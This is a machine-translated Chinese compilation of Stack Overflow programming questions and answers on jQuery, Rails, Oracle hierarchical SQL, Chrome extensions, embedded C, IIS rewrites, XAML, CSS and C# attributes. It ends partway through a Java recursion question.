> 时间：2013-01-26T18:55:32.237

我有同样的问题。

我断开了我的 iPhone，从 iPhone 已安装的应用程序中删除了该应用程序，在 XCode 中进行了项目清理，重新连接了 iPhone，并进行了完整的构建并重新部署到 iPhone。

成功！信箱！

# jquery - jQuery：addClass 和 removeClass 的延迟 / setTimeOut

> ID：13806889
> 
> 赞同：0
> 
> 时间：2012-12-10T18:24:45.670
> 
> 标签：jquery, delay, addclass, removeclass

我正在使用以下函数来控制一些社交网络图标的翻转效果。大部分功能（不包括 addClass / removeClass 部分）完美运行，但我需要包含 addClass / removeClass 部分，因为默认图标状态会渗入图标边缘周围的悬停状态。我遇到的问题是我不太清楚如何正确延迟函数的 addClass / removeClass 部分，并且可以使用一些帮助。我需要能够将函数的该部分减慢与函数的主要部分大致相同的量。

```
$(function () {
    $("#fb span, #yt span, #tw span, #sc span, #it span, #my span").css({
        opacity: "0"
    }).mouseover(function () {
        $(this).stop().animate({
            opacity: "1"
        }, {
            duration: 250
        })
        $(this).parent().addClass("nobg");
    }).mouseout(function () {
        $(this).stop().animate({
            opacity: "0"
        }, {
            duration: 250
        })
        $(this).parent().addClass("nobg");
    })
}); 
```

供您参考，我为此使用的 HTML 如下所示：

```
<ul>
    <li><a href="#" target="_blank"><div id="fb">Facebook<span></span></div></a></li>
    <li><a href="#" target="_blank"><div id="yt">YouTube<span></span></div></a></li>
    <li><a href="#" target="_blank"><div id="tw">Twitter<span></span></div></a></li>
    <li><a href="#" target="_blank"><div id="my">myspace<span></span></div></a></li>
    <li><a href="#" target="_blank"><div id="sc">Soundcloud<span></span></div></a></li>
    <li><a href="#" target="blank"><div id="it">iTunes<span></span></div></a></li>
</ul> 
```

提前感谢您提供的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:27:58.033

jQuery`animate()`有一个回调函数，使用它会延迟类的添加，直到动画完成。另一方面，你为什么要两次添加同一个类？

```
$(function () {
    $("#fb span, #yt span, #tw span, #sc span, #it span, #my span")
        .css('opacity', '0')
        .on({
            mouseenter: function () {
                $(this).stop().animate({opacity: 1}, 250, function() {
                    $(this).parent().addClass("nobg");
                });
            },
            mouseleave: function () {
                $(this).stop().animate({opacity: 0}, 250, function() {
                    $(this).parent().addClass("nobg");
                });
            }
    });
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:35:02.007

您的 CSS 实现有点偏离，但对您的 jQuery 进行了轻微修改，这可能就是您要找的吗？

[http://jsfiddle.net/dboots/6zDhE/](http://jsfiddle.net/dboots/6zDhE/)

```
$(function () {
    //-- init link span opacity to 0
    $("#fb span, #yt span, #tw span, #sc span, #it span, #my span").css({
        opacity: "0"
    });

    //-- add mouseover/mouseout event handler to the span parents
    $('#fb, #yt, #tw, #sc, #it, #my').mouseover(function () {

        //-- find the current span element we are working with.
        var el = $(this).find('span');

        el.stop().animate({
            opacity: "1"
        }, {
            duration: 250
        })
        el.parent().addClass("nobg");
    }).mouseout(function () {
        var el = $(this).find('span');
        el.stop().animate({
            opacity: "0"
        }, {
            duration: 250
        })
        el.parent().addClass("nobg");
    })
});​ 
```

关于您的 CSS 有点偏离，如果您将类添加到父 div 并以这种方式引用它们，维护起来会更容易一些。

例如：

[http://jsfiddle.net/dboots/6zDhE/1/](http://jsfiddle.net/dboots/6zDhE/1/)

HTML：

```
<ul>
    <li><a href="#" target="_blank"><div class="social_link" id="fb">Facebook<span>1</span></div></a></li>
    <li><a href="#" target="_blank"><div class="social_link" id="yt">YouTube<span>2</span></div></a></li>
    <li><a href="#" target="_blank"><div class="social_link" id="tw">Twitter<span>3</span></div></a></li>
    <li><a href="#" target="_blank"><div class="social_link" id="my">myspace<span>4</span></div></a></li>
    <li><a href="#" target="_blank"><div class="social_link" id="sc">Soundcloud<span></span></div></a></li>
    <li><a href="#" target="_blank"><div class="social_link" id="it">iTunes<span></span></div></a></li>
</ul>​ 
```

JS：

```
$(function () {
    //-- This should probably be accomplished via CSS instead?
    //-- ex.) .social_link span { display: none; }

    $('.social_link span').css({
        opacity: "0"
    });

    $('.social_link').mouseover(function () {
        var el = $(this).find('span');
        el.stop().animate({
            opacity: "1"
        }, {
            duration: 250
        })
        el.parent().addClass("nobg");
    }).mouseout(function () {
        var el = $(this).find('span');
        el.stop().animate({
            opacity: "0"
        }, {
            duration: 250
        })
        el.parent().addClass("nobg");
    })
});​ 
```

# ruby-on-rails - 成员路由的 URL 助手在测试环境中未定义

> ID：13806891
> 
> 赞同：0
> 
> 时间：2012-12-10T18:24:51.987
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1

添加三个自定义成员路由后，在开发和生产环境中一切正常，但在测试环境中失败。

在`config/routes.rb`中，我们的自定义成员路由是复制、下载和中止：

```
resources :kw_researches do
  member do
    get 'copy'
    get 'download'
    put 'abort'
  end
end 
```

运行`rake routes`显示成员路线都很好而且花花公子（不足为奇，因为它们实际上在生产和开发中工作）：

```
$ rake routes
    copy_kw_research GET    /kw_researches/:id/copy(.:format)     kw_researches#copy
download_kw_research GET    /kw_researches/:id/download(.:format) kw_researches#download
   abort_kw_research PUT    /kw_researches/:id/abort(.:format)    kw_researches#abort
       kw_researches GET    /kw_researches(.:format)              kw_researches#index
                     POST   /kw_researches(.:format)              kw_researches#create
     new_kw_research GET    /kw_researches/new(.:format)          kw_researches#new
    edit_kw_research GET    /kw_researches/:id/edit(.:format)     kw_researches#edit
         kw_research GET    /kw_researches/:id(.:format)          kw_researches#show
                     PUT    /kw_researches/:id(.:format)          kw_researches#update
                     DELETE /kw_researches/:id(.:format)          kw_researches#destroy 
```

但是两者的测试都失败了，`./spec/views/kw_researches/index.html.erb_spec.rb`并`./spec/integration/kw_research_index_page_spec.rb`出现以下错误：

```
 10) KwResearch index page KwResearch has all relevant actions
     Failure/Error: visit kw_researches_path
     ActionView::Template::Error:
       undefined method `copy_kw_research_path' for #<#<Class:0x007faab8c9a238>:0x007faab717fd40> 
```

为什么`copy_kw_research_path`不可用，而它的好（标准助手）朋友`edit_kw_research_path`却可用？谢谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-07T11:26:21.047

两周后，当我们回到这个问题时，它就消失了：似乎重新启动 rails server (thin) 和 guard 解决了它。

# javascript - 刷新时随机文本

> ID：13806893
> 
> 赞同：0
> 
> 时间：2012-12-10T18:24:58.013
> 
> 标签：javascript

我正在尝试在刷新时进行简单的文本更改：

```
<strong>Title</strong>
<p id="myQuote">Slogan</p> 
```

并且“口号”部分在刷新时发生了变化：

```
var myQuotes = new Array();
myQuotes[0] = "To be or not to be";
myQuotes[1] = "The only thing we have to fear is fear itself";
myQuotes[2] = "Give me liberty or give me death";

var myRandom = Math.floor(Math.random()*myQuotes.length);

$('#myQuote').html(myQuotes[myRandom]); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:29:51.143

在加载 DOM 之前，您无法选择或操作 DOM 元素。

如[this fiddle所示](http://jsfiddle.net/Hn6fL/1/)`$('#myQuote').html`，将您的电话包装在 a 中。[`$(document).ready(function() { ... })`](http://api.jquery.com/ready/)

或者，将您的`<script>`标签放在您的底部，`<body>`以便它在 DOM 的其余部分之后加载。（请参阅 Unobtrusive JavaScript 中关于加载时间选项的进一步讨论[：<script> 在 HTML 代码的顶部还是底部？](https://stackoverflow.com/questions/143486/unobtrusive-javascript-script-at-the-top-or-the-bottom-of-the-html-code)。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:31:50.780

我的猜测是 jQuery 没有加载....

```
if (jQuery) {  
    alert('jQuery is loaded'); 
} else {
    alert('not loaded');
} 
```

然后检查您是否从随机函数中获取值。

```
var myRandom = Math.floor(Math.random()*myQuotes.length);

alert(myQuotes[myRandom]); //Add this to your code

$('#myQuote').html(myQuotes[myRandom]); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:36:08.223

替换以下内容以避免在脚本中使用 jQuery

[http://jsfiddle.net/TYEGh/](http://jsfiddle.net/TYEGh/)

```
$('#myQuote').html(myQuotes[myRandom]); 
```

和

```
document.getElementById('myQuote').innerHTML= myQuotes[myRandom]; 
```

# java - Eclipse 的 Portlet 向导

> ID：13806898
> 
> 赞同：1
> 
> 时间：2012-12-10T18:25:11.970
> 
> 标签：java, eclipse, eclipse-plugin, websphere, portlet

我开始使用portlet（Websphere Portal），网络中的所有“操作方法”都显示了一个向导（新项目-> Portlet项目）启动项目，但我找不到任何工作的人日食朱诺。另外，在 IBM 的 RAD 中我找不到：/。我尝试安装[http://marketplace.eclipse.org/content/portlet-tools#.UMYj9nd8D0M](http://marketplace.eclipse.org/content/portlet-tools#.UMYj9nd8D0M)但没有任何反应。Eclipse Juno 有向导吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T20:53:34.313

我不知道 Juno，但如果你想在 Eclipse 中创建 Portlet，一些插件是不必要的。您只需要创建动态 Web 项目并将 Portlet jar 添加为依赖\库\jar。[http://jcp.org/en/jsr/detail?id=286](http://jcp.org/en/jsr/detail?id=286)然后您需要创建扩展 GenericPortlet 的 java 类，添加 portlet.xml 描述符并构建您的应用程序（项目 - 导出 - 战争）。基本示例[http://publib.boulder.ibm.com/infocenter/wpdoc/v510/index.jsp?topic=/com.ibm.wp.ent.doc/wps/wpsbscfg.html](http://publib.boulder.ibm.com/infocenter/wpdoc/v510/index.jsp?topic=/com.ibm.wp.ent.doc/wps/wpsbscfg.html)

# css - 检查屏幕宽度是否大于高度，反之亦然 - 可以吗？

> ID：13806906
> 
> 赞同：0
> 
> 时间：2012-12-10T18:25:24.330
> 
> 标签：css, orientation, screen-orientation

所以我对媒体查询进行了相当多的阅读，我明白了为什么在大多数情况下只指定一个尺寸并追踪设备可能有用......但是如果你只是在寻找设备是纵向还是景观？

我真正想要的是能够检查屏幕的宽度或高度是否最长，然后根据答案运行不同的 CSS。理想情况下，我希望能够内联完成这一切，而不是运行不同的外部样式表。

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:35:53.523

正如 Ryan 和 Cimmanon 所说，是的，可以做到。媒体查询有一个漂亮的小选项，称为[方向](http://www.quirksmode.org/blog/archives/2010/04/the_orientation.html)，您可以将其设置为“纵向”或“横向”。

但是请记住，并非所有设备/浏览器都支持某些或任何媒体查询，因此请确保您为那些会忽略您的样式的人设置了一些默认样式。

# google-chrome-extension - 下载 url chrome 扩展

> ID：13806908
> 
> 赞同：6
> 
> 时间：2012-12-10T18:25:26.657
> 
> 标签：google-chrome-extension

我正在尝试通过为 chrome 扩展编写代码来下载 url。这是 myscript.js 文件：

```
chrome.downloads.download(
    {url: 'http://www.iana.org/_img/iana-logo-pageheader.png',
     saveAs: true
    },
    function(res){alert(res);}); 
```

这是我的 manifest.json

```
{
  "name": "My extension",
  "version": "1.0",
  "manifest_version":2,
  "background_page": "background.html",
  "browser_action": {
    "name": "Manipulate DOM",
    "icons": ["icon.png"],
    "default_icon": "icon.png"
  },
  "permissions": ["downloads",
    "tabs", "http://*/*","https://*/*"
  ],
  "content_scripts": [
    {
      "matches": [ "http://*/*", "https://*/*"],
      "js": ["jquery.js","d3.v2.js","myscript.js"],
      "run_at": "document_end"
    }
  ]
} 
```

但控制台显示错误“无法调用未定义的方法'下载'”。请帮我。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-10T22:01:36.203

文档[`chrome.downloads`](http://developer.chrome.com/extensions/downloads.html)明确指出“API 仍在开发中。它**仅适用于开发[早期发布通道](http://www.chromium.org/getting-involved/dev-channel)**上的 Chrome 用户。” （重点是我的，目前在 Chrome 23）。

要使用 API，您需要获得Chrome的**开发**版或**金丝雀版（请参阅**[此页面](http://www.chromium.org/getting-involved/dev-channel)以获取下载链接）。

解决问题的另一种方法是不使用`chrome.downloads`API。我一直在使用以下方法来创建下载，它就像一个魅力（它可以在任何地方工作：内容脚本/背景页面/弹出/任何东西）：

```
var a = document.createElement('a');
a.href = 'http://www.iana.org/_img/iana-logo-pageheader.png';
a.download = 'iana-logo-pageheader.png'; // Filename
a.click();                               // Trigger download 
```

`a.click()`导致 Chrome 跟随链接。
该`download`属性使 Chrome 下载目标，并在“另存为”对话框中建议该属性的值作为文件名。

此功能不仅限于 Chrome 扩展，您还可以在普通网页中使用它。看看这个演示：http: [//jsfiddle.net/dEeHF/](http://jsfiddle.net/dEeHF/)。

# sql - 计算其父母拥有的根的百分比

> ID：13806910
> 
> 赞同：13
> 
> 时间：2012-12-10T18:25:39.677
> 
> 标签：sql, oracle, hierarchy, oracle11gr2, connect-by

简而言之，我试图计算其父母拥有的树根的百分比，进一步向上。如何仅在 SQL 中执行此操作？

这是我的（示例）架构。请注意，虽然层次结构本身非常简单，但还有一个额外的`holding_id`，这意味着单亲可以“拥有”其孩子的不同部分。

```
create table hierarchy_test ( 
       id number -- "root" ID
     , parent_id number -- Parent of ID
     , holding_id number -- The ID can be split into multiple parts
     , percent_owned number (3, 2)
     , primary key (id, parent_id, holding_id) 
        ); 
```

以及一些示例数据：

```
insert all 
 into hierarchy_test values (1, 2, 1, 1) 
 into hierarchy_test values (2, 3, 1, 0.25)
 into hierarchy_test values (2, 4, 1, 0.25)
 into hierarchy_test values (2, 5, 1, 0.1)
 into hierarchy_test values (2, 4, 2, 0.4)
 into hierarchy_test values (4, 5, 1, 1)
 into hierarchy_test values (5, 6, 1, 0.3)
 into hierarchy_test values (5, 7, 1, 0.2)
 into hierarchy_test values (5, 8, 1, 0.5)
select * from dual; 
```

[SQL小提琴](http://www.sqlfiddle.com/#!4/c3d5d/2)

以下查询返回我想要进行的计算。由于 SYS_CONNECT_BY_PATH 的性质，据我所知，它不能自行执行计算。

```
 select a.*, level as lvl
      , '1' || sys_connect_by_path(percent_owned, ' * ') as calc
   from hierarchy_test a
  start with id = 1
connect by nocycle prior parent_id = id 
```

数据中存在周期性关系，只是在这个例子中没有。

目前我将使用一个非常简单的函数将`calc`列中的字符串转换为数字

```
create or replace function some_sum ( P_Sum in varchar2 ) return number is
   l_result number;
begin  
   execute immediate 'select ' || P_Sum || ' from dual'
     into l_result;

   return l_result;   
end;
/ 
```

这似乎是一种荒谬的方式，我宁愿避免解析动态 SQL ¹所花费的额外时间。

从理论上讲，我认为，我应该能够使用 MODEL 子句来计算这一点。我的问题是由树的非唯一性引起的。我使用 MODEL 子句执行此操作的尝试之一是：

```
select *
  from ( select a.*, level as lvl
              , '1' || sys_connect_by_path(percent_owned, ' * ') as calc
           from hierarchy_test a
          start with id = 1
        connect by nocycle prior parent_id = id
                 )
 model
 dimension by (lvl ll, id ii)
 measures (percent_owned, parent_id )
 rules upsert all ( 
   percent_owned[any, any]
   order by ll, ii  = percent_owned[cv(ll), cv(ii)] * nvl( percent_owned[cv(ll) - 1, parent_id[cv(ll), cv(ii)]], 1)
               ) 
```

可以理解的是，这失败了，原因如下：

> ORA-32638: 模型维度中的非唯一寻址

由于类似的原因，使用[UNIQUE SINGLE REFERENCE](http://docs.oracle.com/cd/E11882_01/server.112/e25554/sqlmodel.htm#DWHSG8797)失败，即 ORDER BY 子句不是唯一的。

### tl;博士

有没有一种简单的方法可以仅使用 SQL 来计算其父母所拥有的树根的百分比？如果我在 MODEL 的正确轨道上，我哪里错了？

[1\. 我还想避免 PL/SQL SQL 上下文切换。我意识到这是很短的时间，但如果不每天增加几分钟，这将很难快速完成。]

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-10T20:41:07.833

在 11g 中，可能类似于-

```
SELECT a.*, LEVEL AS lvl
      ,XMLQuery( substr( sys_connect_by_path( percent_owned, '*' ), 2 ) RETURNING CONTENT).getnumberval() AS calc
   FROM hierarchy_test a
  START WITH id = 1
CONNECT BY nocycle PRIOR parent_id = id; 
```

[SQL 小提琴](http://sqlfiddle.com/#!4/c3d5d/68)。

或者，根据您的`'1'||`技巧-

```
SELECT a.*, LEVEL AS lvl
      , XMLQuery( ('1'|| sys_connect_by_path( percent_owned, '*' )) RETURNING CONTENT).getnumberval() AS calc
   FROM hierarchy_test a
  START WITH id = 1
CONNECT BY nocycle PRIOR parent_id = id; 
```

不幸的是，在 10g 中，`XMLQuery`不能接受函数并且总是需要一个字符串文字来进行评估，例如 -

```
select XMLQuery('1*0.25' RETURNING CONTENT).getnumberval() as val 
  from dual; 
```

工作并返回`0.25`，但是

```
select XMLQuery(substr('*1*0.25',2) RETURNING CONTENT).getnumberval() as val
   from dual; 
```

给`ORA-19102: XQuery string literal expected`.

`XMLQuery`查询可能会随着树上的级别数量的增加而变慢，同时还会增加内部树创建本身的额外开销。实现结果的最佳方法仍然是 PL/SQL 函数，顺便说一下，它可以在 10g 和 11g 中工作。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-07-29T20:44:54.700

这值得回答；虽然要注意我们是在一些特殊情况下运行的。

首先要提到的是，按照 Daniel Hilgarth 和 jonearles 在评论中的说法，最好的方法是使用递归子查询分解/递归 CTE：

```
with temp (id, parent_id, percent_owned, calc) as (
  select a.id, a.parent_id, a.percent_owned, percent_owned as calc
    from hierarchy_test a
   where id = 1
   union all
  select a.id, a.parent_id, a.percent_owned, a.percent_owned * t.calc as calc
    from temp t
    join hierarchy_test a
      on t.parent_id = a.id
         )
select * 
  from temp 
```

[他们的 SQL Fiddle。](http://www.sqlfiddle.com/#!4/c3d5d/102).

不幸的是，查询的复杂性和我们正在处理的数据的大小使得这是不可能的。如果不每次都对一些过大的表进行全扫描，就没有办法做到这一点。

这并不一定意味着我们回到了`CONNECT BY`. 有机会批量计算层次结构。不幸的是，这也被证明是不可能的。一个小时内数据库崩溃了。三次。我们使用了将近 100GB 的 UNDO，而服务器无法应付。

这些是特殊情况；我们最多只能在几个小时内计算出数十万个层次结构。平均一个深度约为 1.5 层，总共可能有 5-10 个叶子和 8-12 个节点。但是，异常值有 90k 个节点、27 个级别和多个循环关系。离群值还远远不够罕见。

所以，`CONNECT BY`。针对问题中建议的 PL/SQL 对[Annjawn 的解决方案](https://stackoverflow.com/a/13808867/458741)进行基准测试`EXECUTE IMMEDIATE`表明，对于高于平均水平的树`XMLQuery()`，其速度要慢 4 倍。太好了，有答案；没有其他选择；就这样吧。

不是。

*因为我们要计算如此多的层次结构和如此多的节点，所以我们最终会从库缓存 pin 锁定*中获得过长的等待，这是由于对`EXECUTE IMMEDIATE`.

对此没有明显的反应，所以回到 Annjawn 的解决方案，它最终快了 3 倍！图书馆*缓存销锁*完全消失，我们又回到了笔直狭窄的道路上。

不是。

不幸的是，当您将和 DBMS_SCHEDULER结合起来时`CONNECT BY`，似乎会出现 11.2 中的 Oracle 错误。`XMLQuery()`在某些情况下，通常在较大的层次结构中，它会泄漏大量内存。丢失了数据库*和*服务器找到了那个。已向 Oracle 提出报告，我们正在 12c 中进行测试；尽管内存泄漏的表现较少，但它们仍然出现，因此 12c 已失效。

解决方案？将 包装`XMLQuery()`在 PL/SQL 函数中。内存泄漏解决了，不幸的是，这导致了这个函数的大量争用，我们开始获得多小时的*库缓存：互斥锁 x*等待.. 查询`x$kglob`确认它正在`XMLTYPE`被锤击。

[Andrey Nikolaev 建议](http://andreynikolaev.wordpress.com/2011/05/01/divide-and-conquer-the-true-mutex-contention/)要么改变系统；要么 而不是在其他一切正常时这样做，或者使用该[`DBMS_POOL.MARKHOT`](http://docs.oracle.com/cd/E11882_01/appdev.112/e25788/d_shared_pool.htm#CIHEACGD)过程告诉 Oracle 您将经常访问该对象。随便看看，这可能已经解决了这个问题，然而，大约 10 分钟后，并且经历了 Oracle 拥有的所有锁，我们最终有 5 个进程争夺 CPU。显然还不够（测试盒上有 54GB 和 24 个核心）...

然后我们开始获取*Cursor pin: s*等待。[Burleson 建议使用](http://www.dba-oracle.com/t_cursor_pin_wait_on_x.htm)更多隐藏参数融资，[Jonathan Lewis 建议](http://jonathanlewis.wordpress.com/2007/04/16/sga-resizing/)这取决于 SGA 调整大小。由于数据库正在使用自动 SGA 大小调整，我们尝试逐渐增加*共享池*，最高可达 30GB，并且只恢复了老朋友*库缓存：mutex x* wait。

那么，解决方案是什么？谁知道这是诚实的答案，但到目前为止，Java 存储过程工作得非常出色，没有内存泄漏，没有等待，并且比其他任何事情都快得多。

`MODEL`我敢肯定还有更多……如果有人有任何想法，我真的很想让该条款生效吗？

PS我不能为这一切申请功劳；大约 3 个人的工作让我们走到了这个阶段……

# c - 通过函数返回和外部变量

> ID：13806912
> 
> 赞同：0
> 
> 时间：2012-12-10T18:25:45.883
> 
> 标签：c

我正在从 Microchip 开始对 dspic33 进行编程，当我尝试返回外部变量时遇到问题。我的代码分为 3 个文件，如下所示：

```
main.c  

#include <stdio.h>           /*printf definition ... */
#include "clock.h"
volatile unsigned long count = 0;

int16_t main(void)
{

clock_init();

 while(1)
{
  if(flag)
   {
    printf("MAIN:count = %lu clock_time %lu",count, clock_time());
    flag = 0;
   }
 }
 return 0;
} 
```

* * *

```
clock.h  

...
extern volatile  unsigned long count;
... 
```

* * *

```
clock.c

#include "clock.h"
void __attribute__((__interrupt__, no_auto_psv)) _T1Interrupt(void)
{
 count++;
 flag=1;   
 IFS0bits.T1IF = 0;   
}

unsigned long clock_time(void)   
{
return count;
} 
```

输出类似于：

```
MAIN:count = 1 clock_time : 590106798  
MAIN:count = 2 clock_time : 590106798  
MAIN:count = 3 clock_time : 590106798 
```

等等...

我想知道为什么clock_time() 没有返回正确的计数值。有谁知道我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:31:30.207

您是否尝试在以下之间等待：

```
 printf("MAIN:count = %lu clock_time %lu",count, clock_time());
    wait(1000);
    flag = 0; 
```

也许时钟非常快，而变量的单位太小而无法表示。或者可能是变量类型的 printf 中的转换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:31:45.113

它被声明为`clock_time_t`但你正在返回`unsigned long`。这是一个可能的问题。

您可能`clock_time`在代码中的某处命名了另一个函数？我建议这样做，因为从您在问题中发布的代码中，我看不到它如何输出您所看到的内容。也许您的系统库包含一个`clock_time`.

# iis - 在 web.config 中重定向

> ID：13806915
> 
> 赞同：0
> 
> 时间：2012-12-10T18:25:49.550
> 
> 标签：iis, redirect, rewrite

有人可以让我知道为什么以下内容无法正确重写吗？

```
<rule name="Redirect account listing with levelId" stopProcessing="true">
<match url="^account/([^/]+)/([^/]+)/([^/]+)[?levelId=]$" />
<conditions>
  <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
  <add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" />
</conditions>
<action type="Redirect" url="account/{R:1}/{R:2}/{R:3}" appendQueryString="false" /> 
```

我正在尝试重定向，以便删除 "?levelId=。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T13:36:31.980

我想到了...

```
<rule name="Redirect account listing with levelId b" stopProcessing="true">
<match url="^account/([^/]+)/([^/]+)/([^/]+)" />
<conditions>
  <add input="{REQUEST_METHOD}" pattern="^POST$" negate="true" />
  <add input="{QUERY_STRING}" pattern="^levelID=([^=&amp;]+)$" />
</conditions>
<action type="Redirect" url="account/{R:1}/{R:2}/{R:3}" appendQueryString="false" /> 
```

# xaml - 缩放在 23 和 27 英寸屏幕上不起作用

> ID：13806918
> 
> 赞同：2
> 
> 时间：2012-12-10T18:26:14.610
> 
> 标签：xaml, windows-8, responsive-design, scale

我有两个用户控件，每个控件都有一个网格。第一个定义了高度和宽度：

```
<UserControl
    Height="620"
    Width="450">

   <Grid Margin="50, 0, 0, 50"> 
```

另一个控件只定义高度：

```
<UserControl
    Height="768">
    <Grid> 
```

现在我试图在这样的背景下使用两者：

```
<Grid>
    <Image Source="Assets/background.png" Stretch ="UniformToFill" 
     HorizontalAlignment="Stretch" VerticalAlignment="Stretch"/>

    <Grid >
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto" />
        </Grid.RowDefinitions>

        <Grid.ColumnDefinitions>
           <ColumnDefinition Width="*" />
           <ColumnDefinition Width="*" />
        </Grid.ColumnDefinitions>

        <Controls:EventImagesControl Grid.Row="0" Grid.Column="0"  
                  HorizontalAlignment="Stretch"  
                  VerticalAlignment="Stretch"/>
        <Controls:ScrollControl Grid.Row="0" Grid.Column="1"  
                  HorizontalAlignment="Stretch"  
                  VerticalAlignment="Stretch"/>            
    </Grid>
</Grid> 
```

在以下设置中，一切都按照我的预期进行扩展：

```
10.6" 1024x768
10.6" 1366x768
10.6" 1920x1080
10.6" 2560x1440
12"   1280x800 
```

但是，当我尝试使用以下设置时，它只会在宽度上而不是在高度上缩放（至少看起来如此）

```
23" 1920x1080
27" 2560x1440 
```

我试图避免使用[ViewBox](http://msdn.microsoft.com/en-us/library/windows/apps/xaml/windows.ui.xaml.controls.viewbox.aspx)。我是 windows8/wpf 的新手，但我正在尝试学习如何进行响应式布局。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T19:04:51.560

WinRT 渲染引擎可以缩放，所以一切在物理上都是正确的，这就是为什么 4 个 10.6" 测试看起来大小相同，无论屏幕分辨率如何。12" 测试可以很好地缩放，但是因为它的大小接近 10.6" 并且你不会注意到差异（尽管存在差异），最大的屏幕尺寸会缩放，因此您的 450x620 控件看起来像 450x620 控件和 23" 全高清屏幕，这意味着小控件。

实际上，您发布的链接很好地描述了您可以在现代 UI 应用程序中使用的每种缩放类型。如果您确实需要设置最小尺寸，请改用 MinWidth 和 MinHeight 属性。

# html - CSS 限制表格单元格 TD 内容的边框

> ID：13806923
> 
> 赞同：1
> 
> 时间：2012-12-10T18:26:37.193
> 
> 标签：html, css

大家好，我只是想在文本周围的表格单元格周围设置边框……而不是拉伸整个表格的长度。它周围有边框的部分

![在此处输入图像描述](../Images/7d2ffeebcfb7fa57176e00c41ecf100b.png)

CSS：

```
table.content_table {
width: 100%;
margin: 0px;
border-collapse: collapse;
}
table.content_table > tbody > tr > td.results {
border: 2px solid;
background-color: #eeeecc;
font-size: 8pt;
font-weight: bold;
PADDING: 0px;

} 
```

HTML：

```
 <table class="content_table">
    <br/><br/>
     <h1>Planned Vs Actual Productions Drilldown</h1>

            <tr>
            <td class="results">
         Number of results returned:  ${fn:length(beans)}
        </td>
        </tr> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:29:52.677

答案在于您的表格宽度为 100%。如果没有 TD 级别的任何样式，TD 会自动采用它所能达到的最大宽度。

不过，更大的问题是你为什么要使用一张桌子。这是单列数据，这里不需要表格，用div就行了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:34:21.467

给文本一个简单的 span 或任何其他块元素，如 div p ... span 与 inline-block 也是可以有边框的块元素。

```
table.content_table {
  width: 100%;
  margin: 0px;
  border-collapse: collapse;
}
.border {
  border: 2px solid;
  background-color: #eeeecc;
  font-size: 8pt;
  font-weight: bold;
  PADDING: 0px;
  display: inline-block;
} 
```

表中的任何元素都需要在 TD 中，这样才是有效的 html... 像这样将另一个 tr > td 放入您的表中

```
<table class="content_table">
<tr>
   <td>
     <h1>Planned Vs Actual Productions Drilldown</h1>
   </td>
</tr>
  <tr>
    <td class="results">
        <span class="border">Number of results returned:  ${fn:length(beans)}</span>
    </td>
    </tr>
</table> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-01T06:55:57.067

我在 WordPress 主题上遇到了类似的问题。“折叠”并不完全适用于第一列，因为我的主题 style.css “重置”已将表格宽度设置为 100%。至少对我来说，“自动”宽度解决了这个问题。

```
<style>
  table#donations { border-collapse: collapse; width:auto; }
</style>

<table id="donations">
  <tr><td>Bitcoin BTC</td><td>1Prh5VnUJRQV3sARhEfQAMKv9UzGqgAMXg</td></tr>
</table> 
```

# c# - 覆盖子类中继承的类属性

> ID：13806924
> 
> 赞同：4
> 
> 时间：2012-12-10T18:26:42.670
> 
> 标签：c#, custom-attributes

关于覆盖属性的继承属性有一个很好的[问题。](https://stackoverflow.com/questions/3840196/c-sharp-override-an-attribute-in-a-subclass)

假设一个属性：

```
[AttributeUsage(AttributeTargets.All, Inherited = true)]
public class MyAttributeAttribute : Attribute

//...

public class ParentClass
{
    [MyAttribute]
    public String MyString;
}

public class ChildClass : ParentClass
{
    new public String MyString; //Doesn't have MyAttribute
} 
```

但是如果`MyAttribute`设置为一个类呢？

```
[MyAttribute]
public class ParentClass

public class ChildClass; //Don't want MyAttribute 
```

**有没有办法让 ChildClass 不继承该属性？**

* * *

背景：纯理论。我想让一个属性可继承，并想知道如果某天发生这种情况，我是否可以覆盖它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:53:38.043

您可以复制您引用的问题的答案之一中提到的[BrowsableAttribute方法。](http://msdn.microsoft.com/en-us/library/system.componentmodel.browsableattribute.aspx)您可以使用布尔值创建一个构造函数，当设置为时`false`将表示该属性虽然存在，但不应被处理。您还可以添加一个无参数构造函数，将属性设置为`true`. 这是您最常使用的一种，除非您决定覆盖从基类继承的属性。

```
[AttributeUsage(AttributeTargets.All, Inherited = true)]
public class MyAttributeAttribute : Attribute
{
    public bool Enabled { get; private set; }

    public MyAttributeAttribute()
        :this(true)
    {
    }

    public MyAttributeAttribute(bool enabled)
    {
        Enabled = enabled;
    }
} 
```

然后，当您反思您的类型并寻找属性时，您可以检查该`Enabled`属性，并且只有当它是真的时，您才能真正使用它。

您的示例类层次结构将是：

```
[MyAttribute]
public class ParentClass
[MyAttribute(false)]    
public class ChildClass; //Don't want MyAttribute 
```

# java - 调用递归方法java

> ID：13806925
> 
> 赞同：1
> 
> 时间：2012-12-10T18:26:42.827
> 
> 标签：java

我已经定义了一个递归方法（至少我相信它是递归的），它返回 void 并想在另一个方法中调用它，但不知道如何。我知道这是非常基本的，但有人可以帮忙吗？谢谢。

递归方法：

```
